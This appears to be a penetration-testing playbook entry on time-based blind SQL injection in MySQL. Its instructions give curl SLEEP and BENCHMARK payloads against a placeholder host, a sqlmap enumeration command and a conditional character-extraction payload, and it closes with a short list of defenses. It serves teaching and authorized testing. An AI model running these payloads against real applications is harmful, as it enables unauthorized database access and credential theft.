---
type: procedure
description: >-
  Exploit blind SQL injection vulnerabilities in MySQL databases using
  time-based delays to infer data without visible output.
tactics:
  - '[[Execution]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - sql-injection
  - mysql
  - blind-sqli
  - time-based
commands:
  - '[[commands/curl-mysql-sleep-injection-test]]'
  - '[[commands/curl-mysql-benchmark-injection-test]]'
  - '[[commands/sqlmap-time-based-mysql-scan]]'
platforms:
  - Web
tools:
  - '[[tools/sqlmap]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# Time-Based-Blind-SQL-Injection-in-MySQL

## Summary

This procedure demonstrates how to perform time-based blind SQL injection against MySQL databases in web applications. By injecting SQL payloads that cause conditional delays (using SLEEP or BENCHMARK functions), attackers can infer boolean conditions based on response times, enabling data extraction without direct output from the database.

## Description

Time-based blind SQL injection targets web applications where error messages or data dumps are not visible, but the application responds differently based on query execution time. In MySQL, functions like SLEEP() pause execution for a specified duration, while BENCHMARK() runs a computation loop to simulate delays. This technique is useful when union-based or error-based SQLi fails, such as in filtered or hardened applications. The attack involves crafting payloads to test conditions (e.g., 'if username starts with 'a', delay 5 seconds') and measuring response times to extract data character by character, such as database names, tables, or credentials. It maps to MITRE ATT&CK technique T1190 (Exploit Public-Facing Application) under the Execution tactic, as it leverages web app vulnerabilities for remote code influence.

## Requirements

1. Access to a vulnerable web application endpoint susceptible to SQL injection (e.g., a login form or search parameter using unsanitized user input).
2. Knowledge of the injection point and basic SQL syntax for MySQL.
3. Tools for sending HTTP requests and measuring response times, such as curl or a proxy like Burp Suite.
4. Optional: Automated scanner like sqlmap for efficiency.
5. Network access to the target application (typically over HTTP/HTTPS).

## Defense

- Implement parameterized queries or prepared statements in application code to separate SQL logic from user input.
- Use web application firewalls (WAFs) to detect and block anomalous SQL patterns, including time-delay functions.
- Enable database logging for long-running queries and monitor for unusual delays (e.g., queries exceeding 5 seconds).
- Regularly scan applications with tools like sqlmap or OWASP ZAP to identify injection points.
- Apply input validation, escaping, and least-privilege database accounts to limit impact.

## Objectives

1. Confirm the presence of a time-based blind SQL injection vulnerability.
2. Extract sensitive data from the database, such as user credentials or table contents, by inferring boolean responses via timing.
3. Automate the extraction process for efficiency in real-world engagements.

## Instructions

### Step 1: Identify and Confirm Injection Point

**Context**: Locate a parameter vulnerable to SQL injection (e.g., a search field) and test for basic injection by appending a single quote or comment to observe behavior changes, ensuring the input influences the SQL query.

Use [[commands/curl-mysql-sleep-injection-test]] to send a basic payload and measure response time:

```bash
curl -X GET "http://target.com/search?q='" -w "%{time_total}s\n" -o /dev/null -s
```

> This step verifies if the application processes the input as SQL. A response time anomaly (e.g., syntax error page) indicates vulnerability. Why: Establishes the injection vector before attempting delays.

### Step 2: Test Time-Based Delay with SLEEP

**Context**: Inject a SLEEP payload to confirm blind injection by observing if the response is delayed (e.g., 5 seconds for SLEEP(5)). This proves the attacker can control query execution time.

Reference payloads from [[codes/MySQL-Time-Based-Injection-Payloads]] and execute using [[commands/curl-mysql-sleep-injection-test]]:

```bash
curl -X GET "http://target.com/search?q=1' AND SLEEP(5)--" -w "%{time_total}s\n" -o /dev/null -s
```

> Expected: Response takes ~5 seconds longer than a normal query. If no delay, try URL-encoded variants or adjust for filters. Why: SLEEP is simple and reliable for MySQL; it confirms control without needing output.

### Step 3: Test with BENCHMARK for CPU-Intensive Delay

**Context**: Use BENCHMARK to create a delay via computation instead of sleep, which may evade some WAFs that block SLEEP. This tests if the database executes the injected function.

Use [[commands/curl-mysql-benchmark-injection-test]] with a payload from [[codes/MySQL-Time-Based-Injection-Payloads]]:

```bash
curl -X GET "http://target.com/search?q=1' AND BENCHMARK(10000000,MD5(1))--" -w "%{time_total}s\n" -o /dev/null -s
```

> Expected: Noticeable delay (e.g., 2-5 seconds) based on loop count and system load. Adjust iterations if needed. Why: BENCHMARK simulates load without explicit sleep, useful against filtered environments.

### Step 4: Extract Data Using Conditional Timing

**Context**: Build extraction queries by conditioning delays on data (e.g., delay if the first character of a username is 'a'). Repeat for each bit/character to reconstruct data.

For automation, use [[commands/sqlmap-time-based-mysql-scan]]:

```bash
sqlmap -u "http://target.com/search?q=1" --technique=T --dbms=mysql --dbs --delay=2 --threads=1
```

> Expected: sqlmap outputs discovered databases/tables after timing inferences. Manually, craft payloads like 'AND IF(ASCII(SUBSTRING(user,1,1))>64,SLEEP(5),0)--'. Why: Systematic extraction turns confirmation into data theft; automation speeds up the process.

### Step 5: Verify and Iterate Extraction

**Context**: Confirm extracted data by querying known values or cross-verifying, then expand to dump tables or credentials.

Monitor response times across multiple runs to account for network variability. If successful, proceed to dump specific data using enumerated schema.

> Expected: Consistent delays matching conditions, leading to full data reconstruction. Why: Ensures accuracy in blind scenarios where no direct feedback exists.
